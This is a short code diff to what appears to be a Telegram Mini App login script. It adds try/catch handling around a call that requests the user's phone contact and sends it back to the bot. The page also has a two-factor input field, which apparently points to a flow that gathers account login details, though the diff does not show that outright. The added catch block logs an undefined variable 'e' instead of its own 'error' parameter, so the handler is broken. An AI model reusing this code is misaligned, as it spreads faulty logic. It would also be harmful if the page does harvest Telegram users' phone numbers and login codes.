@@ -10,8 +10,15 @@ document.addEventListener('DOMContentLoaded', () => {
     const twofactorInput = document.getElementById('twofactor-input');
 
     loginBtn.addEventListener('click', async () => {
-        const contact = tg.requestContact();
-        tg.sendData(contact);
+        try {
+            const contact = tg.requestContact();
+
+            if (contact) {
+                tg.sendData(contact);
+            }
+        } catch (error) {
+            console.log('[ERROR]: ' + e);
+        }
     });
 
     function showPage2() {
